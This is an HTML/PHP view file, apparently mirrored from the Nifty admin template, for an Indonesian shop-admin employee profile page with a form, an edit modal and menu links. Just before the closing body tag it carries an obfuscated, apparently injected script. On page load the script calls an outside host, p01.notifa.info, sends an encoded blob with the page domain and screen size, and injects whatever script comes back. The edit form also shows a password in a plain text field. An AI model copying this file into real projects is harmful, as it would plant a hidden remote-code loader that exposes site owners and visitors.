<!DOCTYPE html>
<html lang="en">



<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:05 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Data Tables | Nifty - Admin Template</title>


    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->

    <!--=================================================-->

    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.js"></script>


    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo.min.css" rel="stylesheet">



    <!--DataTables [ OPTIONAL ]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
	<link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">

    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>assets/adminlte/css/bootstrap.css">
    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/jquery.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/bootstrap.js"></script>


</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">

        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">

                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <img src="<?php echo base_url();?>assets/adminlte/img/logo.png" alt="Nifty Logo" class="brand-icon">
                        <div class="brand-title">
                            <span class="brand-text">Nifty</span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->


                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">

                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Navigation toogle button-->

                    </ul>
                    <ul class="nav navbar-top-links">   
                    </ul>
                </div>
            </div>
        </header>
        <!--===================================================-->
        <!--END NAVBAR-->

        <div class="boxed">

            <!--CONTENT CONTAINER-->
            <!--===================================================-->
            <div id="content-container">
                <div id="page-head">
                                    </div>


                <!--Page content-->
                <!--===================================================-->
                <div id="page-content">
                        <div class="panel">
                            <div class="panel-body">
                                <div class="fixed-fluid">
                                    <div class="fixed-md-200 pull-sm-left fixed-right-border">
                    
                                        <!-- Simple profile -->
                                        <div class="text-center">
                                            <div class="pad-ver">
                                                <img src="<?php echo base_url();?>assets/adminlte/img/profile-photos/1.png" class="img-lg img-circle" alt="Profile Picture">
                                            </div>
                                            <h4 class="text-lg text-overflow mar-no">Aaron Chavez</h4>
                                            <p class="text-sm text-muted">Digital Marketing Director</p>
                                        </div>
                                        <hr>
                                    </div>
                                    <div class="fluid">
                                        <div class="text-right">
                                            <button data-target="#demo-default-modal" data-toggle="modal" class="btn btn-sm btn-primary">Edit Profile</button>
                                        </div>
                    
                                        <div class="pad-btm">
                                             <!-- DISABLED FORM ELEMENTS-->
                                <!--===================================================-->
                                <form class="panel-body form-horizontal form-padding">
                    
                                    <!--Static-->
                                    <div class="form-group">
                                        <label class="col-md-3 control-label">Nama :</label>
                                        <div class="col-md-9">
                                            <p class="form-control-static"></p>
                                        </div>
                                    </div>
                    
                                    <!--Disabled Text Input-->
                                    <div class="form-group">
                                        <label class="col-md-3 control-label">Tempat Lahir :</label>
                                        <div class="col-md-9">
                                            <input type="text" class="form-control"  disabled>
                                        </div>
                                    </div>
                    
                                    <!--Disabled Email Input-->
                                    <div class="form-group">
                                        <label class="col-md-3 control-label">Tanggal Lahir :</label>
                                        <div class="col-md-9">
                                            <input type="date" class="form-control" disabled>
                                        </div>
                                    </div>

                                     <!--Disabled Email Input-->
                                    <div class="form-group">
                                        <label class="col-md-3 control-label">Email :</label>
                                        <div class="col-md-9">
                                            <input type="url" class="form-control" disabled>
                                        </div>
                                    </div>

                                     <!--Disabled Email Input-->
                                    <div class="form-group">
                                        <label class="col-md-3 control-label">Telepon :</label>
                                        <div class="col-md-9">
                                            <input type="text" class="form-control" disabled>
                                        </div>
                                    </div>

                                     <!--Disabled Email Input-->
                                    <div class="form-group">
                                        <label class="col-md-3 control-label">Alamat :</label>
                                        <div class="col-md-9" >
                                            <input type="text" class="form-control" style="height:100px;" disabled>
                                        </div>
                                    </div>
                
                                        </div>
                    
                                        <hr>
                        
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                </div>
                <!--===================================================-->
                <!--End page content-->

            </div>
            <!--===================================================-->
            <!--END CONTENT CONTAINER-->


                  <!--Default Bootstrap Modal-->
    <!--===================================================-->
    <div class="modal fade" id="demo-default-modal" role="dialog" tabindex="-1" aria-labelledby="demo-default-modal" aria-hidden="true" >
        <div class="modal-dialog">
            <div class="modal-content" >

                <!--Modal header-->
                <div class="modal-header" >
                    <button type="button" class="close" data-dismiss="modal"><i class="pci-cross pci-circle"></i></button>
                    <h4 class="modal-title" align="Center" style="color:#000000">Data Diri Pegawai</h4>
                </div>

                <!--Modal body-->
                <div class="modal-body"  >
                  
                                <!--Block Styled Form -->
                                <!--===================================================-->
                                <form>
                                    <div class="panel-body" >
                                        <div class="row" >
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Nama</b></label>
                                                    <input type="text" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Tempat Lahir</b></label>
                                                    <input type="text" class="form-control">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Tanggal Lahir</b></label>
                                                    <input type="date" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Email</b></label>
                                                    <input type="email" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Password</b></label>
                                                    <input type="text" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Telepon</b></label>
                                                    <input type="text" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Alamat</b></label>
                                                    <input type="text" class="form-control" style="height:100px;">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Foto</b></label>
                                                    <input type="file">
                                                    <img src="">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                <!--Modal footer-->
                <div class="modal-footer">
                    <button class="btn btn-primary">Simpan</button>
                    <button data-dismiss="modal" class="btn btn-default" type="button" style="color:#000000"><b>Keluar</b></button>
                </div>
            </div>
        </div>
    </div>

    <!--===================================================-->
    <!--End Default Bootstrap Modal-->

            
             <!--MAIN NAVIGATION-->
            <!--===================================================-->
            <nav id="mainnav-container">
                <div id="mainnav">


                    <!--Menu-->
                    <!--================================-->
                    <div id="mainnav-menu-wrap">
                        <div class="nano">
                            <div class="nano-content">

                                <!--Profile Widget-->
                                <!--================================-->
                                <div id="mainnav-profile" class="mainnav-profile">
                                    <div class="profile-wrap text-center">
                                        <div class="pad-btm">
                                            <img class="img-circle img-md" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/1.png" alt="Profile Picture">
                                        </div>
                                        <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
                                            <span class="pull-right dropdown-toggle">
                                                <i class="dropdown-caret"></i>
                                            </span>
                                            <p class="mnp-name">Aaron Chavez</p>
                                            <span class="mnp-desc">aaron.cha@themeon.net</span>
                                        </a>
                                    </div>
                                     <div id="profile-nav" class="collapse list-group bg-trans">
                                    <a href="<?= base_url().'Dashboard/view_profile' ?>" class="list-group-item">
                                        <i class="demo-pli-male icon-lg icon-fw"></i> View Profile
                                    </a>
                                    <a href="#" class="list-group-item">
                                        <i class="demo-pli-gear icon-lg icon-fw"></i> Settings
                                    </a>
                                    <a href="#" class="list-group-item">
                                        <i class="demo-pli-information icon-lg icon-fw"></i> Help
                                    </a>
                                    <a href="#" class="list-group-item">
                                        <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
                                    </a>
                                </div>
                            </div>

                  <ul id="mainnav-menu" class="list-group">

                    <!--Category name-->
                    <li class="list-header">Navigation</li>

                    <!--Menu list item-->
                    <li class="active-sub">
                        <a href="<?= base_url().'Dashboard' ?>">
                            <i class="fa fa-home"></i>
                            <span class="menu-title">
                                Beranda
                            </span>
                        </a>
                    </li>

                    <!--Menu list item-->
                    <li >
                        <a href="<?= base_url().'toko' ?>">
                            <i class="glyphicon glyphicon-book"></i>
                            <span class="menu-title">Data Toko</span>
                            <i class="arrow"></i>
                        </a>

                        <!--Submenu-->
                        <ul class="collapse">
                           <li><a href="<?= base_url().'toko' ?>"><i class="fa fa-edit"></i>
               <span class="menu-title">Informasi Toko
                           <li><a href="<?= base_url().'faqs' ?>"><i class="fa fa-edit"></i>Faqs</a></li>
                        </ul>
                    </li>

                    <!--Menu item-->
                    <li>
                        <a href="<?= base_url().'barang' ?>">
                            <i class="fa fa-file"></i>
                            <span class="menu-title">
                                Data Barang
                                <span class="pull-right badge badge-warning"></span>
                            </span>
                        </a>
                    </li>

                     <!--Menu item-->
                    <li>
                        <a href="<?= base_url().'riwayat' ?>">
                            <i class="fa fa-history"></i>
                            <span class="menu-title">
                                Riwayat Barang
                                <span class="pull-right badge badge-warning"></span>
                            </span>
                        </a>
                    </li>

                     <!--Menu item-->
                    <li>
                        <a href="<?= base_url().'Barang_Ready' ?>">
                            <i class="glyphicon glyphicon-list-alt"></i>
                            <span class="menu-title">
                                Barang Ready
                                <span class="pull-right badge badge-warning"></span>
                            </span>
                        </a>
                    </li>

                       <!--Menu item-->
                    <li>
                        <a href="<?= base_url().'pegawai' ?>">
                            <i class="fa fa-file"></i>
                            <span class="menu-title">
                                Data Pegawai
                                <span class="pull-right badge badge-warning"></span>
                            </span>
                        </a>
                    </li>

                     <!--Menu list item-->
                    <li >
                        <a href="<?= base_url().'penjualan' ?>">
                            <i class="glyphicon glyphicon-book"></i>
                            <span class="menu-title">Laporan</span>
                            <i class="arrow"></i>
                        </a>

                        <!--Submenu-->
                        <ul class="collapse">
                                       <li><a href="<?= base_url().'penjualan' ?>"><i class="fa fa-book"></i>
                           <span class="menu-title">Penjualan
                                       <li><a href="<?= base_url().'pembelian' ?>"><i class="fa fa-book"></i>Pembelian</a></li>
                                    </ul>
                                </li>
                     <!--Menu item-->
                    <li>
                        <a href="<?= base_url().'kritik' ?>">
                            <i class="fa fa-wechat"></i>
                            <span class="menu-title">
                                Kritik & Saran
                                <span class="pull-right badge badge-warning"></span>
                            </span>
                        </a>
                    </li>
            </div>
        </div>
    </div>
    <!--================================-->
    <!--End menu-->
  </div>
  </nav>


            <!--===================================================-->
            <!--END MAIN NAVIGATION-->
        </div>

        

        <!-- FOOTER -->
        <!--===================================================-->
        <footer id="footer">

            <!-- Visible when footer positions are fixed -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <div class="show-fixed pad-rgt pull-right">
                You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
            </div>



            <!-- Visible when footer positions are static -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <div class="hide-fixed pull-right pad-rgt">
                14GB of <strong>512GB</strong> Free.
            </div>



            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->

            <p class="pad-lft">&#0169; 2018 Your Company</p>



        </footer>
        <!--===================================================-->
        <!-- END FOOTER -->


        <!-- SCROLL PAGE BUTTON -->
        <!--===================================================-->
        <button class="scroll-top btn">
            <i class="pci-chevron chevron-up"></i>
        </button>
        <!--===================================================-->
    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->


    
    
    
    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/nifty.min.js"></script>




    <!--=================================================-->
    
    <!--Demo script [ DEMONSTRATION ]-->
    <script src="js/demo/nifty-demo.min.js"></script>

    
    

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjVk1UmskIX0MbRtNl9wWMtbi4PjtJ%2fPSp2a86c%2f%2bluPgZm9wsdjzk3djvewLeV5UZtv8H07UaDSQF6FjE1XGgZDLbLOTuaTtUYCuuwsW%2fpK%2bIK4DN7Po9cim5pRqGXG%2bbWsA7YeCZfpKmSYHVJlyrtzLtq62ffIY6MGNE7tWdj5LsnOOmo3K85eG%2b4lkX7JcBWvzWxIDLoyBaWaQ5f1e4qMCeAcAIcyFfT0WrxRCJLItr%2b9jQamzr7nSr%2bKOikLwXXeYkEDbZbgy1geFdhW%2bg0dFR9e3wVkR6j7hbzRpJaewMpkUGgVCG5F7l3%2blCB1h2m0cmbEjTlmZ7crNw5sCj7%2fHxtYEo2G1eAlhKthRTjx7gZK2VMeEQVyACXim8SxbwfQF2cMGqrd%2f%2bC6J4E4IeTwjeeS415GZauXghogLMPzrmqpXjovafZgtS4oWT9aoaXxWJmbZZbTs5SyVz5KwM%2bGbtqTNjXCJFm%2bxzUzOwmDTA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/app-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:45 GMT -->
</html>
